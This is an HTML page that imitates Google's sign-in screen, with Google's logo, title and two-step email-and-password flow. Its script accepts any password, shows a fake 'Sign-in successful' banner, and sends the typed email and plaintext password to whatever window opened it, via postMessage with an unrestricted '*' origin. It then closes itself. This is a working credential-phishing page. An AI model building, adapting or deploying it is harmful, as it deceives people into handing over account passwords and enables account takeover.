<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in – Google</title>
<script src="https://accounts.google.com/gsi/client" async defer></script>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Roboto, Arial, sans-serif; }
  html, body { height:100%; }
  body {
    min-height:100vh;
    background:#0e0e10;
    color:#e8eaed;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
  }
  .card {
    width:100%;
    max-width:430px;
    background:transparent;
  }
  .step {
    display:none;
    animation:fade .22s ease;
  }
  .step.active { display:block; }
  @keyframes fade {
    from { opacity:0; transform:translateY(8px); }
    to { opacity:1; transform:none; }
  }
  .logo {
    width:44px;
    height:44px;
    display:flex;
    align-items:center;
    justify-content:center;
    margin-bottom:20px;
  }
  .logo svg {
    width:42px;
    height:42px;
    display:block;
  }
  h1 {
    font-size:32px;
    line-height:1.15;
    font-weight:400;
    margin-bottom:10px;
  }
  .sub {
    color:#9aa0a6;
    font-size:15px;
    margin-bottom:28px;
  }
  .field {
    position:relative;
    margin-bottom:8px;
  }
  .field input {
    width:100%;
    padding:16px 14px;
    font-size:16px;
    background:transparent;
    color:#e8eaed;
    border:1px solid #5f6368;
    border-radius:8px;
    outline:none;
  }
  .field input:focus {
    border:2px solid #8ab4f8;
    padding:15px 13px;
  }
  .field label {
    position:absolute;
    left:12px;
    top:16px;
    color:#9aa0a6;
    background:#0e0e10;
    padding:0 4px;
    font-size:16px;
    pointer-events:none;
    transition:.15s ease;
  }
  .field input:focus + label,
  .field input:not(:placeholder-shown) + label {
    top:-8px;
    font-size:12px;
    color:#8ab4f8;
  }
  .link {
    color:#8ab4f8;
    text-decoration:none;
    font-size:14px;
    font-weight:500;
  }
  .link:hover { text-decoration:underline; }
  .hint {
    color:#9aa0a6;
    font-size:13px;
    margin:28px 0;
  }
  .row {
    display:flex;
    align-items:center;
    justify-content:space-between;
    gap:20px;
    margin-top:26px;
  }
  .btn {
    background:#8ab4f8;
    color:#0e0e10;
    border:none;
    padding:12px 28px;
    border-radius:20px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
  }
  .btn:hover { background:#a8c7fa; }
  .btn:disabled {
    opacity:.5;
    cursor:default;
  }
  .back {
    background:none;
    border:none;
    color:#9aa0a6;
    cursor:pointer;
    font-size:20px;
    margin:0 0 8px 0;
  }
  .chip {
    display:inline-flex;
    align-items:center;
    gap:8px;
    border:1px solid #5f6368;
    background:#1c1c1f;
    color:#e8eaed;
    border-radius:20px;
    padding:8px 14px;
    font-size:14px;
    margin-bottom:28px;
    cursor:pointer;
  }
  .check {
    display:flex;
    align-items:center;
    gap:12px;
    margin-top:12px;
    font-size:15px;
    color:#e8eaed;
    cursor:pointer;
  }
  .check input {
    width:18px;
    height:18px;
    accent-color:#8ab4f8;
  }
  .err {
    color:#f28b82;
    font-size:13px;
    margin-top:10px;
    display:none;
  }
  .success-banner {
    display:none;
    margin-top:16px;
    padding:10px 12px;
    border-radius:8px;
    background:rgba(52, 168, 83, 0.12);
    border:1px solid rgba(52, 168, 83, 0.35);
    color:#9fe7b8;
    font-size:13px;
    font-weight:600;
    text-align:center;
  }
  @media (max-width: 420px) {
    body { padding:18px; }
    .row { gap:12px; }
    .btn { padding:12px 20px; }
  }
</style>
</head>
<body>
<main class="card">
  <section class="step active" id="stepEmail">
    <div class="logo" aria-label="Google logo">
      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z" opacity=".15"/>
      </svg>
    </div>
    <h1>Sign in</h1>
    <p class="sub">Use your Google account</p>

    <div class="field">
      <input type="email" id="email" placeholder=" " autocomplete="username">
      <label for="email">Email or phone</label>
    </div>

    <a class="link" href="#">Forgot email?</a>
    <p class="hint">Not your computer? Use Guest mode to sign in privately.</p>

    <div class="row">
      <a class="link" href="#">Create account</a>
      <button class="btn" id="btnToPassword" type="button">Next</button>
    </div>
  </section>

  <section class="step" id="stepPassword">
    <button class="back" id="btnBack" aria-label="Back">&#8592;</button>
    <div class="logo" aria-label="Google logo">
      <svg viewBox="0 0 48 48" aria-hidden="true" focusable="false">
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z"/>
        <path fill="#4285F4" d="M46.5 24.55c0-1.57-.14-3.08-.41-4.55H24v8.62h12.76c-.55 2.96-2.22 5.47-4.73 7.17l7.66 5.95C43.64 37.34 46.5 31.48 46.5 24.55z"/>
        <path fill="#FBBC05" d="M32.03 39.16c-2.06 1.38-4.69 2.19-8.03 2.19-6.31 0-11.66-4.28-13.57-10.02l-7.97 6.18C5.2 43.06 13.98 48 24 48c6.66 0 12.26-2.2 16.33-5.98l-8.3-2.86z"/>
        <path fill="#34A853" d="M10.4 31.33A14.4 14.4 0 0 1 9.5 24c0-1.54.26-3.03.73-4.45l-7.98-6.18A23.98 23.98 0 0 0 0 24c0 3.84.92 7.47 2.56 10.64l7.84-7.31z"/>
        <path fill="#EA4335" d="M24 9.5c3.54 0 6.7 1.22 9.19 3.61l6.85-6.85C35.78 2.45 30.52 0 24 0 14.76 0 6.7 5.39 2.61 13.22l7.98 6.18C12.52 14.48 17.69 9.5 24 9.5z" opacity=".15"/>
      </svg>
    </div>
    <h1>Welcome</h1>
    <button class="chip" id="emailChip" type="button">👤 <span id="chipEmail"></span> ▾</button>

    <div class="field">
      <input type="password" id="password" placeholder=" " autocomplete="current-password">
      <label for="password">Enter your password</label>
    </div>

    <label class="check"><input type="checkbox" id="showPw"> Show password</label>
    <p class="err" id="errMsg">Wrong password. Try again.</p>
    <div class="success-banner" id="successBanner">Sign-in successful</div>

    <div class="row">
      <a class="link" href="#">Forgot password?</a>
      <button class="btn" id="btnSignIn" type="button">Sign in</button>
    </div>
  </section>

</main>

<script>
  const stepEmail = document.getElementById('stepEmail');
  const stepPassword = document.getElementById('stepPassword');
  const emailInput = document.getElementById('email');
  const pwInput = document.getElementById('password');

  document.getElementById('btnToPassword').addEventListener('click', () => {
    const email = emailInput.value.trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      emailInput.focus();
      return;
    }
    document.getElementById('chipEmail').textContent = email;
    stepEmail.classList.remove('active');
    stepPassword.classList.add('active');
    pwInput.focus();
  });

  document.getElementById('btnBack').addEventListener('click', () => {
    stepPassword.classList.remove('active');
    stepEmail.classList.add('active');
    document.getElementById('errMsg').style.display = 'none';
  });

  document.getElementById('emailChip').addEventListener('click', () => {
    document.getElementById('btnBack').click();
  });

  document.getElementById('showPw').addEventListener('change', (e) => {
    pwInput.type = e.target.checked ? 'text' : 'password';
  });

  document.getElementById('btnSignIn').addEventListener('click', () => {
    const email = emailInput.value.trim();
    const password = pwInput.value.trim();

    if (!email || !password) {
      document.getElementById('errMsg').style.display = 'block';
      return;
    }

    const successBanner = document.getElementById('successBanner');
    successBanner.style.display = 'block';
    successBanner.textContent = 'Sign-in successful';

    const payload = {
      type: 'auth-gate-success',
      provider: 'google',
      email,
      password,
      displayName: email.split('@')[0] || 'Google User'
    };

    if (window.opener) {
      window.opener.postMessage(payload, '*');
      setTimeout(() => window.close(), 700);
      return;
    }

    setTimeout(() => { window.location.href = '/'; }, 700);
  });

  function onGoogleSignIn(response) {
    if (!response || !response.credential) return;
    const payload = {
      type: 'auth-gate-success',
      provider: 'google',
      email: 'google.user@gmail.com',
      password: 'google-demo-pass',
      displayName: 'Google User'
    };

    if (window.opener) {
      window.opener.postMessage(payload, '*');
      window.close();
      return;
    }

    window.location.href = '/';
  }

</script>
</body>
</html>
